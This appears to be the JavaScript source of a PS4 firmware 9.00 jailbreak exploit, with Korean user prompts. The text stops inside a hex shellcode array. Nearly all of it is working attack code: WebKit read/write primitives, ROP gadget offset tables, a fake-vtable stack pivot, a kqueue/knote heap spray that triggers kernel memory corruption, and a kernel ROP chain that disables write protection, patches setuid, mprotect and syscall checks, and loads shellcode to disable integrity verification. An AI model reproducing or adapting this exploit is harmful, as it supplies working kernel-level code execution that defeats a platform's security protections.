var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;

var webKitBase;
var webKitRequirementBase;

var libSceLibcInternalBase;
var libKernelBase;

var textArea = document.createElement("textarea");

const OFFSET_wk_vtable_first_element = 0x104f110;
const OFFSET_WK_memset_import = 0x000002a8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xd68;

const OFFSET_WKR_psl_builtin = 0x33ba0;

const OFFSET_WK_setjmp_gadget_one = 0x0106acf7;
const OFFSET_WK_setjmp_gadget_two = 0x01ece1d3;
const OFFSET_WK_longjmp_gadget_one = 0x0106acf7;
const OFFSET_WK_longjmp_gadget_two = 0x01ece1d3;

const OFFSET_libcint_memset = 0x0004f810;
const OFFSET_libcint_setjmp = 0x000bb5bc;
const OFFSET_libcint_longjmp = 0x000bb616;

const OFFSET_WK2_TLS_IMAGE = 0x38e8020;

const OFFSET_lk___stack_chk_fail = 0x0001ff60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000afa0;

var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
  ret: 0x32,
  "pop rdi": 0x319690,
  "pop rsi": 0x1f4d6,
  "pop rdx": 0x986c,
  "pop rcx": 0x657b7,
  "pop r8": 0xafaa71,
  "pop r9": 0x422571,
  "pop rax": 0x51a12,
  "pop rsp": 0x4e293,

  "mov [rdi], rsi": 0x1a97920,
  "mov [rdi], rax": 0x10788f7,
  "mov [rdi], eax": 0x9964bc,

  "cli ; pop rax": 0x566f8,
  sti: 0x1fbbcc,

  "mov rax, [rax]": 0x241cc,
  "mov rax, [rsi]": 0x5106a0,
  "mov [rax], rsi": 0x1efd890,
  "mov [rax], rdx": 0x1426a82,
  "mov [rax], edx": 0x3b7fe4,
  "add rax, rsi": 0x170397e,
  "mov rdx, rax": 0x53f501,
  "add rax, rcx": 0x2fbcd,
  "mov rsp, rdi": 0x2048062,
  "mov rdi, [rax + 8] ; call [rax]": 0x751ee7,
  infloop: 0x7dff,

  "mov [rax], cl": 0xc6eaf,
};

var wkr_gadgetmap = {
  "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0, //JOP 3
};

var wk2_gadgetmap = {
  "mov [rax], rdi": 0xffdd7,
  "mov [rax], rcx": 0x2c9eca,
  "mov [rax], cx": 0x15a7d52,
};
var hmd_gadgetmap = {
  "add [r8], r12": 0x2bce1,
};
var ipmi_gadgetmap = {
  "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344b,
};

function userland() {
  //RW -> ROP method is strongly based off of:
  //https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit

  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.array_from_address = array_from_address;
  p.readstr = readstr;

  //pointer to vtable address
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  var textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

  libSceLibcInternalBase = p.read8(
    get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import))
  );
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

  libKernelBase = p.read8(
    get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import))
  );
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

  webKitRequirementBase = p.read8(
    get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import))
  );
  webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

  for (var gadget in wk_gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (var gadget in wkr_gadgetmap) {
    window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
  }

  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xffff;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25ff) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }

  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(0x8), size);
    p.write4(og_array_i.add32(0xc), 0x1);

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }

  function readstr(addr) {
    var str = "";
    for (var i = 0; ; i++) {
      var c = p.read1(addr.add32(i));
      if (c == 0x0) {
        break;
      }
      str += String.fromCharCode(c);
    }
    return str;
  }

  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(
    fakeVtable_setjmp.add32(0xa8),
    webKitBase.add32(OFFSET_WK_setjmp_gadget_two)
  ); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(
    fakeVtable_setjmp.add32(0x8),
    libSceLibcInternalBase.add32(OFFSET_libcint_setjmp)
  );
  p.write8(
    fakeVtable_setjmp.add32(0x1c8),
    webKitBase.add32(OFFSET_WK_setjmp_gadget_one)
  ); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(
    fakeVtable_longjmp.add32(0xa8),
    webKitBase.add32(OFFSET_WK_longjmp_gadget_two)
  ); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(
    fakeVtable_longjmp.add32(0x8),
    libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)
  );
  p.write8(
    fakeVtable_longjmp.add32(0x1c8),
    webKitBase.add32(OFFSET_WK_longjmp_gadget_one)
  ); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  function launch_chain(chain) {
    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(
      modified_context.add32(0x40),
      p.read8(original_context.add32(0x40))
    );

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;

  for (var i = 0; i < 0x40000; i++) {
    if (
      kview[i] == 0x72 &&
      kview[i + 1] == 0x64 &&
      kview[i + 2] == 0x6c &&
      kview[i + 3] == 0x6f &&
      kview[i + 4] == 0x63
    ) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (
      kview[i] == 0x48 &&
      kview[i + 1] == 0xc7 &&
      kview[i + 2] == 0xc0 &&
      kview[i + 7] == 0x49 &&
      kview[i + 8] == 0x89 &&
      kview[i + 9] == 0xca &&
      kview[i + 10] == 0x0f &&
      kview[i + 11] == 0x05
    ) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);

  chain = new rop();

  //Sanity check
  if (chain.syscall(20).low == 0) {
    alert("헐...골드헨 탈옥이 실패했습니다ㅠㅠ USB를 빼고 (PS)홈키를 꾸욱 눌러 [전원->PS4를 재기동] 해주세요.");
    while (1);
  }
}

function run_hax() {
  userland();
  if (chain.syscall(23, 0).low != 0x0) {
    kernel();
  }
  LoaderPL();
}

function kernel() {
  extra_gadgets();
  kchain_setup();
  object_setup();
  trigger_spray();
  patch_once();
}

var handle;
var random_path;
var ex_info;

function load_prx(name) {
  //sys_dynlib_load_prx
  var res = chain.syscall(
    594,
    p.stringify(`/${random_path}/common/lib/${name}`),
    0x0,
    handle,
    0x0
  );
  if (res.low != 0x0) {
    alert("failed to load prx/get handle " + name);
  }
  //sys_dynlib_get_info_ex
  p.write8(ex_info, 0x1a8);
  res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
  if (res.low != 0x0) {
    alert("failed to get module info from handle");
  }
  var tlsinit = p.read8(ex_info.add32(0x110));
  var tlssize = p.read4(ex_info.add32(0x11c));

  if (tlssize != 0) {
    if (name == "libSceWebKit2.sprx") {
      tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
    } else {
      alert(
        `${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`
      );
    }
  }
  return tlsinit;
}

//Obtain extra gadgets through module loading
function extra_gadgets() {
  handle = p.malloc(0x1e8);
  var randomized_path_length_ptr = handle.add32(0x4);
  var randomized_path_ptr = handle.add32(0x14);
  ex_info = randomized_path_ptr.add32(0x40);

  p.write8(randomized_path_length_ptr, 0x2c);
  chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
  random_path = p.readstr(randomized_path_ptr);

  var ipmi_addr = load_prx("libSceIpmi.sprx");
  var hmd_addr = load_prx("libSceHmd.sprx");
  var wk2_addr = load_prx("libSceWebKit2.sprx");

  for (var gadget in hmd_gadgetmap) {
    window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
  }
  for (var gadget in wk2_gadgetmap) {
    window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
  }
  for (var gadget in ipmi_gadgetmap) {
    window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
  }

  for (var gadget in window.gadgets) {
    p.read8(window.gadgets[gadget]);
    //Ensure all gadgets are available to kernel.
    chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
  }
  chain.run();
}

//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
function kchain_setup() {
  const KERNEL_busy = 0x1b28df8;

  const KERNEL_bcopy = 0xacd;
  const KERNEL_bzero = 0x2713fd;
  const KERNEL_pagezero = 0x271441;
  const KERNEL_memcpy = 0x2714bd;
  const KERNEL_pagecopy = 0x271501;
  const KERNEL_copyin = 0x2716ad;
  const KERNEL_copyinstr = 0x271b5d;
  const KERNEL_copystr = 0x271c2d;
  const KERNEL_setidt = 0x312c40;
  const KERNEL_setcr0 = 0x1fb949;
  const KERNEL_Xill = 0x17d500;
  const KERNEL_veriPatch = 0x626874;
  const KERNEL_enable_syscalls_1 = 0x490;
  const KERNEL_enable_syscalls_2 = 0x4b5;
  const KERNEL_enable_syscalls_3 = 0x4b9;
  const KERNEL_enable_syscalls_4 = 0x4c2;
  const KERNEL_mprotect = 0x80b8d;
  const KERNEL_prx = 0x23aec4;
  const KERNEL_dlsym_1 = 0x23b67f;
  const KERNEL_dlsym_2 = 0x221b40;
  const KERNEL_setuid = 0x1a06;
  const KERNEL_syscall11_1 = 0x1100520;
  const KERNEL_syscall11_2 = 0x1100528;
  const KERNEL_syscall11_3 = 0x110054c;
  const KERNEL_syscall11_gadget = 0x4c7ad;
  const KERNEL_mmap_1 = 0x16632a;
  const KERNEL_mmap_2 = 0x16632d;
  const KERNEL_setcr0_patch = 0x3ade3b;
  const KERNEL_kqueue_close_epi = 0x398991;

  SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
  KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
  //negative offset of kqueue string to kernel base
  //0xFFFFFFFFFF86B593 0x505
  //0xFFFFFFFFFF80E364 0x900
  p.write8(KERNEL_BASE_PTR, new int64(0xff80e364, 0xffffffff));

  kchain = new rop();
  kchain2 = new rop();
  //Ensure the krop stack remains available.
  {
    chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
    chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
    chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
  }
  chain.run();

  kchain.count = 0;
  kchain2.count = 0;

  kchain.set_kernel_var(KERNEL_BASE_PTR);
  kchain2.set_kernel_var(KERNEL_BASE_PTR);

  kchain.push(gadgets["pop rax"]);
  kchain.push(SAVED_KERNEL_STACK_PTR);
  kchain.push(gadgets["mov [rax], rdi"]);
  kchain.push(gadgets["pop r8"]);
  kchain.push(KERNEL_BASE_PTR);
  kchain.push(gadgets["add [r8], r12"]);

  //Sorry we're closed
  kchain.kwrite1(KERNEL_busy, 0x1);
  kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.

  var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
  var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
  //Modify UD
  kchain.push(gadgets["pop rdi"]);
  kchain.push(0x6);
  kchain.push(gadgets["pop rsi"]);
  kchain.push(gadgets["mov rsp, rdi"]);
  kchain.push(gadgets["pop rdx"]);
  kchain.push(0xe);
  kchain.push(gadgets["pop rcx"]);
  kchain.push(0x0);
  kchain.push(gadgets["pop r8"]);
  kchain.push(0x0);
  var idx1_dest = kchain.get_rsp();
  kchain.pushSymbolic(); // overwritten with KERNEL_setidt

  kchain.push(gadgets["pop rsi"]);
  kchain.push(0x80040033);
  kchain.push(gadgets["pop rdi"]);
  kchain.push(kchain2.stack);
  var idx2_dest = kchain.get_rsp();
  kchain.pushSymbolic(); // overwritten with KERNEL_setcr0

  kchain.finalizeSymbolic(idx1, idx1_dest);
  kchain.finalizeSymbolic(idx2, idx2_dest);

  //Initial patch(es)
  kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
  kchain2.kwrite1(KERNEL_bcopy, 0xeb);
  //might as well do the others
  kchain2.kwrite1(KERNEL_bzero, 0xeb);
  kchain2.kwrite1(KERNEL_pagezero, 0xeb);
  kchain2.kwrite1(KERNEL_memcpy, 0xeb);
  kchain2.kwrite1(KERNEL_pagecopy, 0xeb);
  kchain2.kwrite1(KERNEL_copyin, 0xeb);
  kchain2.kwrite1(KERNEL_copyinstr, 0xeb);
  kchain2.kwrite1(KERNEL_copystr, 0xeb);

  //I guess you're not all that bad...
  kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again

  //Restore original UD
  var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
  var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
  kchain2.push(gadgets["pop rdi"]);
  kchain2.push(0x6);
  kchain2.push(gadgets["pop rsi"]);
  var idx3_dest = kchain2.get_rsp();
  kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
  kchain2.push(gadgets["pop rdx"]);
  kchain2.push(0xe);
  kchain2.push(gadgets["pop rcx"]);
  kchain2.push(0x0);
  kchain2.push(gadgets["pop r8"]);
  kchain2.push(0x0);
  var idx4_dest = kchain2.get_rsp();
  kchain2.pushSymbolic(); // overwritten with KERNEL_setidt

  kchain2.finalizeSymbolic(idx3, idx3_dest);
  kchain2.finalizeSymbolic(idx4, idx4_dest);

  //Apply kernel patches
  kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
  //patch in reverse because /shrug
  kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xeb);
  kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
  kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);

  kchain2.kwrite1(KERNEL_setuid, 0xeb);
  kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
  kchain2.kwrite2(KERNEL_prx, 0xe990);
  kchain2.kwrite1(KERNEL_dlsym_1, 0xeb);
  kchain2.kwrite4(KERNEL_dlsym_2, 0xc3c03148);

  kchain2.kwrite1(KERNEL_mmap_1, 0x37);
  kchain2.kwrite1(KERNEL_mmap_2, 0x37);

  kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
  kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
  kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

  //Restore CR0
  kchain2.kwrite4(KERNEL_setcr0_patch, 0xc3c7220f);
  var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
  kchain2.push(gadgets["pop rdi"]);
  kchain2.push(0x80050033);
  var idx5_dest = kchain2.get_rsp();
  kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
  kchain2.finalizeSymbolic(idx5, idx5_dest);

  //Recover
  kchain2.rax_kernel(KERNEL_kqueue_close_epi);
  kchain2.push(gadgets["mov rdx, rax"]);
  kchain2.push(gadgets["pop rsi"]);
  kchain2.push(SAVED_KERNEL_STACK_PTR);
  kchain2.push(gadgets["mov rax, [rsi]"]);
  kchain2.push(gadgets["pop rcx"]);
  kchain2.push(0x10);
  kchain2.push(gadgets["add rax, rcx"]);
  kchain2.push(gadgets["mov [rax], rdx"]);
  kchain2.push(gadgets["pop rdi"]);
  var idx6 = kchain2.pushSymbolic();
  kchain2.push(gadgets["mov [rdi], rax"]);
  kchain2.push(gadgets["sti"]);
  kchain2.push(gadgets["pop rsp"]);
  var idx6_dest = kchain2.get_rsp();
  kchain2.pushSymbolic(); // overwritten with old stack pointer
  kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
  //Map fake object
  var fake_knote = chain.syscall(
    477,
    0x4000,
    0x4000 * 0x3,
    0x3,
    0x1010,
    0xffffffff,
    0x0
  );
  var fake_filtops = fake_knote.add32(0x4000);
  var fake_obj = fake_knote.add32(0x8000);
  if (fake_knote.low != 0x4000) {
    alert("enomem: " + fake_knote);
    while (1);
  }
  //setup fake object
  //KNOTE
  {
    p.write8(fake_knote, fake_obj);
    p.write8(fake_knote.add32(0x68), fake_filtops);
  }
  //FILTOPS
  {
    p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
    p.write8(
      fake_filtops.add32(0x0),
      gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]
    ); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
    p.write8(fake_filtops.add32(0x8), kchain.stack);
    p.write8(
      fake_filtops.add32(0x10),
      gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]
    ); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
  }
  //OBJ
  {
    p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
  }
  //Ensure the fake knote remains available
  chain.syscall(203, fake_knote, 0xc000);
}

var trigger_spray = function () {
  var NUM_KQUEUES = 0x1b0;
  var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
  //Make kqueues
  {
    for (var i = 0; i < NUM_KQUEUES; i++) {
      chain.fcall(window.syscalls[362]);
      chain.write_result4(kqueue_ptr.add32(0x4 * i));
    }
  }
  chain.run();
  var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

  var that_one_socket = chain.syscall(97, 2, 1, 0);
  if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
    alert("invalid socket");
    while (1);
  }

  //Spray kevents
  var kevent = p.malloc(0x20);
  p.write8(kevent.add32(0x0), that_one_socket);
  p.write4(kevent.add32(0x8), 0xffff + 0x010000);
  p.write4(kevent.add32(0xc), 0x0);
  p.write8(kevent.add32(0x10), 0x0);
  p.write8(kevent.add32(0x18), 0x0);
  //
  {
    for (var i = 0; i < NUM_KQUEUES; i++) {
      chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
    }
  }
  chain.run();

  //Fragment memory
  {
    for (var i = 18; i < NUM_KQUEUES; i += 2) {
      chain.fcall(window.syscalls[6], kqueues[i]);
    }
  }
  chain.run();

  //Trigger OOB
  alert(
    `
    탈옥을 시작합니다.  (9.00탈옥-USB)를 넣어주세요.

    왼쪽 위에 [USB가 대응하지 않는다] 팝업이 뜰때까지 기다려주세요.

    팝업이 뜨고 2~3초후 [OK]를 눌러 주세요.`
  );
  //Trigger corrupt knote
  {
    for (var i = 1; i < NUM_KQUEUES; i += 2) {
      chain.fcall(window.syscalls[6], kqueues[i]);
    }
  }
  chain.run();
  if (chain.syscall(23, 0).low == 0) {
    {
      //cleanup fake knote & release locked gadgets/stack.
      chain.fcall(window.syscalls[73], 0x4000, 0xc000);
      chain.fcall(window.syscalls[325]);
    }
    chain.run();
    alert("골드헨 탈옥이 성공하였습니다   d^v^b~♪   [탈옥-USB] 를 빼고 OK를 눌러주세요,");
    return;
  }
  alert(`헐...골드헨 탈옥이 실패했습니다ㅠㅠ USB를 빼고 (PS)홈키를 꾸욱 눌러 전원->PS4를 재기동 해주세요.`);
  p.write8(0, 0);
  return;
};

//This disables sysveri, see patch.s for more info
var patch_once = function () {
  var patch_buffer = chain.syscall(
    477,
    0x0,
    0x4000,
    0x7,
    0x1000,
    0xffffffff,
    0
  );
  var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);

  patch_buffer_view[0] = 0x00000bb8;
  patch_buffer_view[1] = 0xfe894800;
  patch_buffer_view[2] = 0x033d8d48;
  patch_buffer_view[3] = 0x0f000000;
  patch_buffer_view[4] = 0x4855c305;
  patch_buffer_view[5] = 0x8b48e589;
  patch_buffer_view[6] = 0x95e8087e;
  patch_buffer_view[7] = 0xe8000000;
  patch_buffer_view[8] = 0x00000175;
  patch_buffer_view[9] = 0x033615ff;
  patch_buffer_view[10] = 0x8b480000;
  patch_buffer_view[11] = 0x0003373d;
  patch_buffer_view[12] = 0x3f8b4800;
  patch_buffer_view[13] = 0x74ff8548;
  patch_buffer_view[14] = 0x3d8d48eb;
  patch_buffer_view[15] = 0x0000029d;
  patch_buffer_view[16] = 0xf9358b48;
  patch_buffer_view[17] = 0x48000002;
  patch_buffer_view[18] = 0x0322158b;
  patch_buffer_view[19] = 0x8b480000;
  patch_buffer_view[20] = 0x00d6e812;
  patch_buffer_view[21] = 0x8d480000;
  patch_buffer_view[22] = 0x00029f3d;
  patch_buffer_view[23] = 0x358b4800;
  patch_buffer_view[24] = 0x000002e4;
  patch_buffer_view[25] = 0x05158b48;
  patch_buffer_view[26] = 0x48000003;
  patch_buffer_view[27] = 0xb9e8128b;
  patch_buffer_view[28] = 0x48000000;
  patch_buffer_view[29] = 0x02633d8d;
  patch_buffer_view[30] = 0x8b480000;
  patch_buffer_view[31] = 0x0002bf35;
  patch_buffer_view[32] = 0x158b4800;
  patch_buffer_view[33] = 0x000002c8;
  patch_buffer_view[34] = 0xe8128b48;
  patch_buffer_view[35] = 0x0000009c;
  patch_buffer_view[36] = 0x7a3d8d48;
  patch_buffer_view[37] = 0x48000002;
  patch_buffer_view[38] = 0x02aa358b;
  patch_buffer_view[39] = 0x8b480000;
  patch_buffer_view[40] = 0x0002ab15;
  patch_buffer_view[41] = 0x128b4800;
  patch_buffer_view[42] = 0x00007fe8;
  patch_buffer_view[43] = 0x0185e800;
  patch_buffer_view[44] = 0xc35d0000;
  patch_buffer_view[45] = 0x6d3d8948;
  patch_buffer_view[46] = 0x48000002;
  patch_buffer_view[47] = 0x026e3d01;
  patch_buffer_view[48] = 0x01480000;
  patch_buffer_view[49] = 0x00026f3d;
  patch_buffer_view[50] = 0x3d014800;
  patch_buffer_view[51] = 0x00000270;
  patch_buffer_view[52] = 0x713d0148;
  patch_buffer_view[53] = 0x48000002;
  patch_buffer_view[54] = 0x02723d01;
  patch_buffer_view[55] = 0x01480000;
  patch_buffer_view[56] = 0x0002933d;
  patch_buffer_view[57] = 0x3d014800;
  patch_buffer_view[58] = 0x00000294;
  patch_buffer_view[59] = 0x653d0148;
  patch_buffer_view[60] = 0x48000002;
  patch_buffer_view[61] = 0x02663d01;
  patch_buffer_view[62] = 0x01480000;
  patch_buffer_view[63] = 0x0002873d;
  patch_buffer_view[64] = 0x3d014800;
  patch_buffer_view[65] = 0x00000288;
  patch_buffer_view[66] = 0x893d0148;
  patch_buffer_view[67] = 0x48000002;
  patch_buffer_view[68] = 0x028a3d01;
  patch_buffer_view[69] = 0x01480000;
  patch_buffer_view[70] = 0x00028b3d;
  patch_buffer_view[71] = 0x3d014800;
  patch_buffer_view[72] = 0x0000024c;
  patch_buffer_view[73] = 0x3d3d0148;
  patch_buffer_view[74] = 0xc3000002;
  patch_buffer_view[75] = 0xe5894855;
  patch_buffer_view[76] = 0x10ec8348;
  patch_buffer_view[77] = 0x24348948;
  patch_buffer_view[78] = 0x24548948;
  patch_buffer_view[79] = 0xed15ff08;
  patch_buffer_view[80] = 0x48000001;
  patch_buffer_view[81] = 0x4b74c085;
  patch_buffer_view[82] = 0x48c28948;
  patch_buffer_view[83] = 0x4840408b;
  patch_buffer_view[84] = 0x2f74c085;
  patch_buffer_view[85] = 0x28788b48;
  patch_buffer_view[86] = 0x243c3b48;
  patch_buffer_view[87] = 0x8b480a74;
  patch_buffer_view[88] = 0xc0854800;
  patch_buffer_view[89] = 0xeceb1d74;
  patch_buffer_view[90] = 0x18788b48;
  patch_buffer_view[91] = 0x74ff8548;
  patch_buffer_view[92] = 0x7f8b48ed;
  patch_buffer_view[93] = 0x7c3b4810;
  patch_buffer_view[94] = 0xe2750824;
  patch_buffer_view[95] = 0xff1040c7;
  patch_buffer_view[96] = 0x48ffffff;
  patch_buffer_view[97] = 0x31107a8d;
  patch_buffer_view[98] = 0x31d231f6;
  patch_buffer_view[99] = 0xa515ffc9;
  patch_buffer_view[100] = 0x48000001;
  patch_buffer_view[101] = 0x5d10c483;
  patch_buffer_view[102] = 0x894855c3;
  patch_buffer_view[103] = 0xc0200fe5;
  patch_buffer_view[104] = 0xffff2548;
  patch_buffer_view[105] = 0x220ffffe;
  patch_buffer_view[106] = 0x3d8b48c0;
  patch_buffer_view[107] = 0x000001c8;
  patch_buffer_view[108] = 0x909007c7;
  patch_buffer_view[109] = 0x47c79090;
  patch_buffer_view[110] = 0x48909004;
  patch_buffer_view[111] = 0x358b48b8;
  patch_buffer_view[112] = 0x000001ac;
  patch_buffer_view[113] = 0x08778948;
  patch_buffer_view[114] = 0x651047c7;
  patch_buffer_view[115] = 0xc73c8b48;
  patch_buffer_view[116] = 0x00251447;
  patch_buffer_view[117] = 0x47c70000;
  patch_buffer_view[118] = 0x89480018;
  patch_buffer_view[119] = 0x1c47c738;
  patch_buffer_view[120] = 0xb8489090;
  patch_buffer_view[121] = 0x7d358b48;
  patch_buffer_view[122] = 0x48000001;
  patch_buffer_view[123] = 0xc7207789;
  patch_buffer_view[124] = 0xc7482847;
  patch_buffer_view[125] = 0x47c70100;
  patch_buffer_view[126] = 0x0000002c;
  patch_buffer_view[127] = 0x778d48e9;
  patch_buffer_view[128] = 0x158b4834;
  patch_buffer_view[129] = 0x00000150;
  patch_buffer_view[130] = 0x89f22948;
  patch_buffer_view[131] = 0x8b483057;
  patch_buffer_view[132] = 0x00016b35;
  patch_buffer_view[133] = 0x568d4800;
  patch_buffer_view[134] = 0xd7294805;
  patch_buffer_view[135] = 0xc148ff89;
  patch_buffer_view[136] = 0x814808e7;
  patch_buffer_view[137] = 0x0000e9cf;
  patch_buffer_view[138] = 0x3e894800;
  patch_buffer_view[139] = 0x00000d48;
  patch_buffer_view[140] = 0x220f0001;
  patch_buffer_view[141] = 0x55c35dc0;
  patch_buffer_view[142] = 0x0fe58948;
  patch_buffer_view[143] = 0x2548c020;
  patch_buffer_view[144] = 0xfffeffff;
  patch_buffer_view[145] = 0x48c0220f;
  patch_buffer_view[146] = 0x013a3d8b;
  patch_buffer_view[147] = 0x07c70000;
  patch_buffer_view[148] = 0x00c3c031;
  patch_buffer_view[149] = 0x353d8b48;
  patch_buffer_view[150] = 0xc7000001;
  patch_buffer_view[151] = 0xc3c03107;
  patch_buffer_view[152] = 0x3d8b4800;
  patch_buffer_view[153] = 0x00000130;
  patch_buffer_view[154] = 0xc03107c7;
  patch_buffer_view[155] = 0x8b4800c3;
  patch_buffer_view[156] = 0x00012b3d;
  patch_buffer_view[157] = 0x3107c700;
  patch_buffer_view[158] = 0x4800c3c0;
  patch_buffer_view[159] = 0x00a63d8b;
  patch_buffer_view[160] = 0x87c70000;
  patch_buffer_view[161] = 0x001f1e01;
  patch_buffer_view[162] = 0x9090f631;
  patch_buffer_view[163] = 0x1e0587c7;
  patch_buffer_view[164] = 0xc931001f;
  patch_buffer_view[165] = 0x87c79090;
